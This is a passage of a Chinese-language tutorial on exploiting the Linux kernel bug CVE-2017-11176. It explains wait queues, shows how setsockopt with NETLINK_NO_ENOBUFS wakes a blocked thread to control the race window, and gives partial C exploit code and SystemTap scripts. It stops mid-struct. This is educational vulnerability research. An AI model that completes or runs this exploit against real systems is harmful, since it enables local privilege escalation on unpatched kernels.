<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">try_to_wake_up</span><span class="params">(struct task_struct *p, <span class="keyword">unsigned</span> <span class="keyword">int</span> state,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">int</span> wake_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rq</span> *<span class="title">rq</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut (find the appropriate run queue) ...</span></span><br><span class="line"></span><br><span class="line">out_activate:</span><br><span class="line">    schedstat_inc(p, se.nr_wakeups);              <span class="comment">// &lt;----- update some stats</span></span><br><span class="line">    <span class="keyword">if</span> (wake_flags &amp; WF_SYNC)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_sync);</span><br><span class="line">    <span class="keyword">if</span> (orig_cpu != cpu)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_migrate);</span><br><span class="line">    <span class="keyword">if</span> (cpu == this_cpu)</span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_local);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        schedstat_inc(p, se.nr_wakeups_remote);</span><br><span class="line">    activate_task(rq, p, en_flags);               <span class="comment">// &lt;----- put it back to run queue!</span></span><br><span class="line">    success = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    p-&gt;state = TASK_RUNNING;                      <span class="comment">// &lt;----- the state has changed!</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是调用<strong>activate_task()**的地方（还有其他地方），因为任务现在回到run queue中并且其状态为TASK_RUNNING，所以它可能被调度。因此，在调用</strong>schedule()**时的位置继续执行。</p>
<p>实际上，很少直接调用**__wake_up()**而是调用辅助宏：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// [include/linux/wait.h]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up(x)          __wake_up(x, TASK_NORMAL, 1, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_nr(x, nr)       __wake_up(x, TASK_NORMAL, nr, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_all(x)          __wake_up(x, TASK_NORMAL, 0, NULL)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible(x)    __wake_up(x, TASK_INTERRUPTIBLE, 1, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible_nr(x, nr) __wake_up(x, TASK_INTERRUPTIBLE, nr, NULL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> wake_up_interruptible_all(x)    __wake_up(x, TASK_INTERRUPTIBLE, 0, NULL)</span></span><br></pre></td></tr></table></figure>

<h4 id="一个完整的示例"><a href="#一个完整的示例" class="headerlink" title="一个完整的示例"></a>一个完整的示例</h4><p>这是一个简单的例子来总结上述概念：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">resource_a</span> &#123;</span></span><br><span class="line">  <span class="keyword">bool</span> resource_is_ready;</span><br><span class="line">  <span class="keyword">wait_queue_head_t</span> wq;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_0_wants_resource_a</span><span class="params">(struct resource_a *res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!res-&gt;resource_is_ready) &#123;</span><br><span class="line">    <span class="comment">// &quot;register&quot; to be woken up</span></span><br><span class="line">    DECLARE_WAITQUEUE(task0_wait_element, current);</span><br><span class="line">    add_wait_queue(&amp;res-&gt;wq, &amp;task0_wait_element);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// start sleeping</span></span><br><span class="line">    __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">    schedule();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// We&#x27;ll restart HERE once woken up</span></span><br><span class="line">    <span class="comment">// Remember to &quot;unregister&quot; from wait queue</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">XXX:</span> ... do something with the resource ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">task_1_makes_resource_available</span><span class="params">(struct resource_a *res)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  res-&gt;resource_is_ready = <span class="literal">true</span>;</span><br><span class="line">  wake_up_interruptible_all(&amp;res-&gt;wq);  <span class="comment">// &lt;--- unblock &quot;task 0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个线程运行<strong>task_0_tants_resource_a()**后，会因为资源不可用而被阻塞，在某些时候，资源所有者（来自另一个线程）使其可用并调用</strong>task_1_makes_resource_available()<strong>。在此之后，</strong>task_0_tants_resource_a()**可恢复执行。</p>
<p>我们经常在Linux内核代码中看到pattern，你现在知道它的含义。注意术语“资源”在这以通用方式使用。任务可以等待事件、条件为真或其他情况。每当你看到一个阻塞系统调用时，等待队列的可能性就不大了（Every time you see a “blocking” syscall, chances are a wait queue is not that far）。</p>
<h3 id="0x02-Unblocking-the-Main-Thread"><a href="#0x02-Unblocking-the-Main-Thread" class="headerlink" title="0x02 Unblocking the Main Thread"></a>0x02 Unblocking the Main Thread</h3><p>在<a href="https://sunichi.github.io/2019/07/22/CVE-2017-11176-1/">此前的文章</a>中，我们尝试并解决了强制<strong>netlink_attachskb()**返回1时的几个问题。第一个问题是调用</strong>mq_notify()<strong>时被阻塞。为了解决这个问题，我们简单地</strong>绕过<strong>了对</strong>schedule_timeout()<strong>的调用，但随后又进入了</strong>无限循环<strong>。我们通过从文件描述符表（FDT）中删除目标文件描述符来停止循环，这偶然满足了一个条件：它使第二个</strong>fget()*<em>调用返回NULL。这是通过</em>System Tap*脚本完成的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    function force_trigger:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">    %&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = (<span class="title">void</span>*) <span class="title">STAP_ARG_arg_sock</span>;</span></span><br><span class="line">[<span class="number">0</span>]   sk-&gt;sk_flags |= (<span class="number">1</span> &lt;&lt; SOCK_DEAD); <span class="comment">// avoid blocking the thread</span></span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = (<span class="title">void</span>*) <span class="title">sk</span>;</span></span><br><span class="line">      nlk-&gt;state |= <span class="number">1</span>;   <span class="comment">// enter the netlink_attachskb() retry path    </span></span><br><span class="line"></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> = <span class="title">current</span>-&gt;<span class="title">files</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span> = <span class="title">files_fdtable</span>(<span class="title">files</span>);</span></span><br><span class="line">      fdt-&gt;fd[<span class="number">3</span>] = <span class="literal">NULL</span>; <span class="comment">// makes the second call to fget() fails</span></span><br><span class="line">    %&#125;</span><br></pre></td></tr></table></figure>

<p>在这一章中，我们将会尝试移除脚本中[0]处的代码，这意味着**mq_notify()**的调用会重新阻塞。在这我们有两种解决办法：</p>
<ol>
<li>如同stap脚本一样把sock标记为SOCK_DEAD</li>
<li>Unblock thread</li>
</ol>
<h4 id="控制并赢得条件竞争"><a href="#控制并赢得条件竞争" class="headerlink" title="控制并赢得条件竞争"></a>控制并赢得条件竞争</h4><p>我们的主线程被阻止实际上是一件好事，还记得补丁描述了一个关于“窗口”的东西？我们的攻击场景是什么？</p>
<p><img src="https://github.com/sunichi/hexo_images/blob/master/blog/CVE-2017-11176/2.png?raw=true" alt="流程图"></p>
<p>所以，“小窗口”是我们有机会调用close()的地方。调用close()将使fget()的调用返回NULL。窗口本身在调用fget()成功后开启，并在第二次调用fget()之前关闭。在攻击场景中，我们在netlink_attachskb()之后调用close()，但是在stap脚本中，我们实际上是在调用netlink_attachskb()之前模拟了它。</p>
<p>如果我们绕过调用schedule_timeout()，那么竞争窗口确实是“小”的。这不是System Tap的问题，因为我们在调用netlink_attachskb()之前修改了内核数据，我们在用户态不会拥有这种权限。</p>
<p>另一方面，如果我们可以在netlink_attachskb()中间阻塞并有办法恢复它，那么竞争窗口实际上就比我们想的要大。换句话说，我们就有办法<strong>控制竞争条件</strong>，我们可以将其视作在主线程中设置了“断点”。</p>
<p>(图待上传)</p>
<p>阻塞主线程似乎是赢得条件竞争的一个好方法，但这意味着我们需要有办法恢复被阻塞的主线程。</p>
<h4 id="Identify-“unblocker”-candidates"><a href="#Identify-“unblocker”-candidates" class="headerlink" title="Identify “unblocker” candidates"></a>Identify “unblocker” candidates</h4><p>在本节中，我们将看到netlink_attachskb()如何被阻塞及解除阻塞。再来看下netlink_attachskb()的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">netlink_attachskb</span><span class="params">(struct sock *sk, struct sk_buff *skb,</span></span></span><br><span class="line"><span class="function"><span class="params">              <span class="keyword">long</span> *timeo, struct sock *ssk)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span>;</span></span><br><span class="line"></span><br><span class="line">      nlk = nlk_sk(sk);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &#123;</span><br><span class="line">[<span class="number">0</span>]     DECLARE_WAITQUEUE(wait, current);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!*timeo) &#123;</span><br><span class="line">          <span class="comment">// ... cut (unreachable code from mq_notify) ...</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>]     __set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">[<span class="number">2</span>]     add_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> ((atomic_read(&amp;sk-&gt;sk_rmem_alloc) &gt; sk-&gt;sk_rcvbuf || test_bit(<span class="number">0</span>, &amp;nlk-&gt;state)) &amp;&amp;</span><br><span class="line">            !sock_flag(sk, SOCK_DEAD))</span><br><span class="line">[<span class="number">4</span>]       *timeo = schedule_timeout(*timeo);</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]     __set_current_state(TASK_RUNNING);</span><br><span class="line">[<span class="number">6</span>]     remove_wait_queue(&amp;nlk-&gt;wait, &amp;wait);</span><br><span class="line"></span><br><span class="line">        sock_put(sk);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (signal_pending(current)) &#123;</span><br><span class="line">          kfree_skb(skb);</span><br><span class="line">          <span class="keyword">return</span> sock_intr_errno(*timeo);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      skb_set_owner_r(skb, sk);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>__set_current_state(TASK_INTERRUPTIBLE)</strong>[1]和<strong>schedule_timeout()</strong>[4]的结合使得线程被阻塞，条件[3]为真是因为：</p>
<ul>
<li>我们使用System Tap强制<em>nlk-&gt;state |= 1</em></li>
<li>sock不是DEAD，我们移除了脚本中的<em>sk-&gt;sk_flags |= (1 &lt;&lt; SOCK_DEAD)</em></li>
</ul>
<p><strong>注</strong>：调用schedule_timeout(MAX_SCHEDULE_TIMEOUT)与调用schedule()等价。</p>
<p>众所周知，如果被阻塞的线程已注册到<strong>wake queue</strong>中，则可以将其唤醒，该注册使用[0]和[2]，而注销在[6]中完成。等待队列本身是<strong>nlk-&gt; wait</strong>。也就是说，它属于netlink_sock对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">    <span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock</span>     <span class="title">sk</span>;</span></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span>   wait;           <span class="comment">// &lt;----- the wait queue</span></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这意味着，<strong>netlink_sock对象负责唤醒被阻塞的线程</strong>。</p>
<p><em>nlk-&gt;wait</em> wait queue在四个地方被使用：</p>
<ol>
<li>__netlink_create()</li>
<li>netlink_release()</li>
<li>netlink_rcv_wake()</li>
<li>netlink_setsockopt()</li>
</ol>
<p>函数__netlink_create()在netlink socket创建的时候被调用，它通过**init_waitqueue_head()**函数初始化一个空的wait queue。</p>
<p>当关联的struct file即将被释放时，将调用函数<strong>netlink_release()**（refcounter变为零）。它调用</strong>wake_up_interruptible_all()**。</p>
<p>函数netlink_rcv_wake()由<strong>netlink_recvmsg()**调用并调用</strong>wake_up_interruptible()*<em>。它这么做实际上是有道理的，因为阻塞的第一个原因是因为接收缓冲区已满。如果调用</em>netlink_recvmsg()*，则接收缓冲区中可能会有更多的空闲空间。</p>
<p>最后，<em>netlink_setsockopt()<em>由系统调用</em>setsockopt()<em>调用。如果optname是</em></em>NETLINK_NO_ENOBUFS<strong>，会调用</strong>wake_up_interruptible()**。</p>
<p>所以我们有三种候选方案来唤醒我们的线程（__netlink_create()除外，它没有唤醒任何东西）。面对这些选择时，我们需要一条路径：</p>
<ul>
<li>快速到达我们所需要的目标（在我们的例子中为wake_up_interruptible()），也就是说，少量的函数调用和条件约束等</li>
<li>对内核几乎没有影响和副作用（没有内存分配，不要触及其他数据结构等）</li>
</ul>
<p>因为我们不想释放与sock相关的struct file并且这是我们可以触发use-after-free的可控方法，我们不使用netlink_release()。</p>
<p>netlink_rcv_wake()路径是最“复杂”的路径，在从recvmsg()系统调用到达它之前，我们需要在<em>generic</em> sock API中通过几个检查，它还分配各种东西等。调用追踪：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- SYSCALL_DEFINE3(recvmsg)</span><br><span class="line">- __sys_recvmsg</span><br><span class="line">- sock_recvmsg</span><br><span class="line">- __sock_recvmsg</span><br><span class="line">- __sock_recvmsg_nosec  // calls sock-&gt;ops-&gt;recvmsg()</span><br><span class="line">- netlink_recvmsg</span><br><span class="line">- netlink_rcv_wake</span><br><span class="line">- wake_up_interruptible</span><br></pre></td></tr></table></figure>

<p>与之相对比的是setsockopt()：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">- SYSCALL_DEFINE5(setsockopt) // calls sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">- netlink_setsockopt()</span><br><span class="line">- wake_up_interruptible</span><br></pre></td></tr></table></figure>

<h4 id="Reaching-wake-up-interruptible-from-setsockopt-syscall"><a href="#Reaching-wake-up-interruptible-from-setsockopt-syscall" class="headerlink" title="Reaching wake_up_interruptible() from setsockopt syscall"></a>Reaching wake_up_interruptible() from setsockopt syscall</h4><p>在之前的小节中，调用wake_up_interruptible()最简单的方法是通过setsockopt系统调用。现在分析下有哪些检查是需要我们绕过的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [net/socket.c]</span></span><br><span class="line"></span><br><span class="line">    SYSCALL_DEFINE5(setsockopt, <span class="keyword">int</span>, fd, <span class="keyword">int</span>, level, <span class="keyword">int</span>, optname,</span><br><span class="line">        <span class="keyword">char</span> __user *, optval, <span class="keyword">int</span>, optlen)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> err, fput_needed;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]   <span class="keyword">if</span> (optlen &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">      sock = sockfd_lookup_light(fd, &amp;err, &amp;fput_needed);</span><br><span class="line">[<span class="number">1</span>]   <span class="keyword">if</span> (sock != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err = security_socket_setsockopt(sock, level, optname);</span><br><span class="line">[<span class="number">2</span>]     <span class="keyword">if</span> (err)</span><br><span class="line">          <span class="keyword">goto</span> out_put;</span><br><span class="line"></span><br><span class="line">[<span class="number">3</span>]     <span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">          err =</span><br><span class="line">              sock_setsockopt(sock, level, optname, optval,</span><br><span class="line">                  optlen);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          err =</span><br><span class="line">[<span class="number">4</span>]           sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">                  optlen);</span><br><span class="line">    out_put:</span><br><span class="line">        fput_light(sock-&gt;file, fput_needed);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们需要：</p>
<ul>
<li>[0] - <strong>optlen</strong>非负</li>
<li>[1] - <strong>fd</strong>是一个有效的的socket</li>
<li>[2] - LSM<strong>必须</strong>允许我们对socket调用setsockopt()</li>
<li>[3] - <strong>level</strong>与SOL_SOCKET不同</li>
</ul>
<p>如果我们绕过了这些检查，netlink_setsockopt()[4]将会被调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// [net/netlink/af_netlink.c]</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">netlink_setsockopt</span><span class="params">(struct socket *sock, <span class="keyword">int</span> level, <span class="keyword">int</span> optname,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">char</span> __user *optval, <span class="keyword">unsigned</span> <span class="keyword">int</span> optlen)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> = <span class="title">sock</span>-&gt;<span class="title">sk</span>;</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> *<span class="title">nlk</span> = <span class="title">nlk_sk</span>(<span class="title">sk</span>);</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span> val = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">[<span class="number">5</span>]   <span class="keyword">if</span> (level != SOL_NETLINK)</span><br><span class="line">        <span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">[<span class="number">6</span>]   <span class="keyword">if</span> (optlen &gt;= <span class="keyword">sizeof</span>(<span class="keyword">int</span>) &amp;&amp; get_user(val, (<span class="keyword">unsigned</span> <span class="keyword">int</span> __user *)optval))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">switch</span> (optname) &#123;</span><br><span class="line">        <span class="comment">// ... cut (other options) ...</span></span><br><span class="line"></span><br><span class="line">[<span class="number">7</span>]   <span class="keyword">case</span> NETLINK_NO_ENOBUFS:</span><br><span class="line">[<span class="number">8</span>]     <span class="keyword">if</span> (val) &#123;</span><br><span class="line">          nlk-&gt;flags |= NETLINK_RECV_NO_ENOBUFS;</span><br><span class="line">          clear_bit(<span class="number">0</span>, &amp;nlk-&gt;state);</span><br><span class="line">[<span class="number">9</span>]       wake_up_interruptible(&amp;nlk-&gt;wait);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          nlk-&gt;flags &amp;= ~NETLINK_RECV_NO_ENOBUFS;</span><br><span class="line">        err = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        err = -ENOPROTOOPT;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在setsockopt()中的检查还有：</p>
<ul>
<li>[5] - <strong>level</strong>等于SOL_NETLINK</li>
<li>[6] - <strong>optlen</strong>必须大于等于<em>sizeof(int)<em>并且</em></em>optval**是可读地址</li>
<li>[7] - <strong>optname</strong>等于NETLINK_NO_ENOBUFS</li>
<li>[8] - <strong>val</strong>不等于0</li>
</ul>
<p>如果我们通过了所有的检查，walk_up_interruptible()将会被调用，被阻塞的进程会被唤醒，下列代码片段就是用来触发它的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC); <span class="comment">// same socket used by blocking thread</span></span><br><span class="line"><span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// different than zero</span></span><br><span class="line">_setsockopt(sock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val));</span><br></pre></td></tr></table></figure>

<h4 id="Updating-The-Exploit"><a href="#Updating-The-Exploit" class="headerlink" title="Updating The Exploit"></a>Updating The Exploit</h4><p>在之前的小节中，我们知道了如何通过setsockopt()系统调用从用户态来触发wake_up_interruptible()，但仍有个问题：如何在我们自己被阻塞的时候去调用其他函数？答案就是利用多线程。所以我们将创建另一个线程（调用<strong>unblock_thread</strong>）并更新我们的exploit（使用”-pthread”编译）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">bool</span> is_ready;  <span class="comment">// we could use pthread&#x27;s barrier here instead</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">unblock_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> *<span class="title">uta</span> = (<span class="title">struct</span> <span class="title">unblock_thread_arg</span>*) <span class="title">arg</span>;</span></span><br><span class="line">  <span class="keyword">int</span> val = <span class="number">3535</span>; <span class="comment">// need to be different than zero</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// notify the main thread that the unblock thread has been created</span></span><br><span class="line">  uta-&gt;is_ready = <span class="literal">true</span>; </span><br><span class="line">  <span class="comment">// WARNING: the main thread *must* directly call mq_notify() once notified!</span></span><br><span class="line">  sleep(<span class="number">5</span>); <span class="comment">// gives some time for the main thread to block</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[unblock] unblocking now\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_setsockopt(uta-&gt;fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &amp;val, <span class="keyword">sizeof</span>(val)))</span><br><span class="line">    perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigevent</span> <span class="title">sigev</span>;</span></span><br><span class="line">  <span class="keyword">char</span> sival_buffer[NOTIFY_COOKIE_LEN];</span><br><span class="line">  <span class="keyword">int</span> sock_fd;</span><br><span class="line">  <span class="keyword">pthread_t</span> tid;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">unblock_thread_arg</span> <span class="title">uta</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// initialize the unblock thread arguments, and launch it</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;uta, <span class="number">0</span>, <span class="keyword">sizeof</span>(uta));</span><br><span class="line">  uta.fd = sock_fd;</span><br><span class="line">  uta.is_ready = <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;creating unblock thread...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ((errno = pthread_create(&amp;tid, <span class="literal">NULL</span>, unblock_thread, &amp;uta)) != <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (uta.is_ready == <span class="literal">false</span>) <span class="comment">// spinlock until thread is created</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;unblocking thread has been created!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get ready to block\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (_mq_notify((<span class="keyword">mqd_t</span>)<span class="number">-1</span>, &amp;sigev))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;mq_notify&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mq_notify succeed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ... cut ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可能有人会注意到代码中调用了sleep(5)和修改了uta-&gt;is_ready，下面来解释一下。</p>
<p>调用<strong>pthread_create()**用于创建线程（即新的task_struct）并启动它。创建任务并不意味着任务将立即运行。为了确保线程已经开始运行，我们使用自旋锁</strong>uta-&gt;is_ready**。</p>
<p>注：自旋锁是最简单的(active)锁，它循环直到变量状态改变。它active是因为在此期间CPU使用率99%。有人可能想要使用类似原子的变量，但这里不需要，因为只有一个writer和一个reader。</p>
<p>主线程陷入无限循环直到unblock_thread解锁它（将is_ready设置为true）。使用多线程可以实现同样的目的（但它并不总是可用）。注意，这里的自旋锁是可自定义的，它只是对线程创建提供了更多控制。如果使用其他进程来实现这个目的话，通常会干扰到攻击，因为创建进程可能意味着大量内存分配。第3部分将需要相同的技术，所以先不在这里介绍它。</p>
<p>另一方面，我们假设在pthread_create()之后，我们的主线程被抢占了“很长”的时间段（即没有执行）。我们有以下顺序：</p>
<p>(图待上传)</p>
<p>在这种情况下，调用setsockopt()在mq_notify阻塞之前。也就是说，setsockopt并不会解锁主线程。这是解锁主线程后进行sleep的原因。换句话说，它至少有5秒钟的时间来调用mq_notify()，可以放心地认为5秒钟足够，因为：</p>
<ul>
<li>如果主线程在5秒后仍然被抢占，则目标系统负载很重，也无论如何都没办法执行exploit</li>
<li>如果unblock_thread与主线程（setsockopt在mq_notify()之前执行）竞争，那么我们总是可以发送一个CTRL+C命令。这样会使得netlink_attachskb()返回-ERESTARTSYS。该路径中未触发bug，我们可以重新运行exploit</li>
</ul>
<p>换句话说，“受控窗口”的持续时间现在是5秒。有的人可能认为这种方式有点简陋，但问题是主线程没用办法通知对方将其唤醒，因为它被阻塞。也许unblock_thread可能可以以某种方式去查询某些信息，但在这里使用sleep就足够了。</p>
<h4 id="Updating-The-STAP-Script"><a href="#Updating-The-STAP-Script" class="headerlink" title="Updating The STAP Script"></a>Updating The STAP Script</h4><p>在运行新的exploit之前，我们需要重新修改STAP脚本。现在，我们在调用netlink_attachskb()之前将netlink socket(fd=3)移除，这意味着我们在进入netlink_attachskb()之后调用setsockopt时，sock_fd是无效的，从而导致setsockopt调用失败。所以我们需要在netlink_attachskb()返回时移除fd 3：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">function force_trigger_before:<span class="keyword">long</span> (arg_sock:<span class="keyword">long</span>)</span><br><span class="line">%&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">netlink_sock</span> &#123;</span></span><br><span class="line">	<span class="comment">/* struct sock has to be the first member of netlink_sock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span>		<span class="title">sk</span>;</span></span><br><span class="line">	u32			portid;</span><br><span class="line">	u32			dst_portid;</span><br><span class="line">	u32			dst_group;</span><br><span class="line">	u32			flags;</span><br><span class="line">	u32			subscriptions;</span><br><span class="line">	u32			ngroups;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		*groups;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span>		state;</span><br><span class="line">	<span class="keyword">size_t</span>			max_recvmsg_len;</span><br><span class="line">	<span class="keyword">wait_queue_head_t</span>	wait;</span><br><span class="line">	<span class="keyword">bool</span>			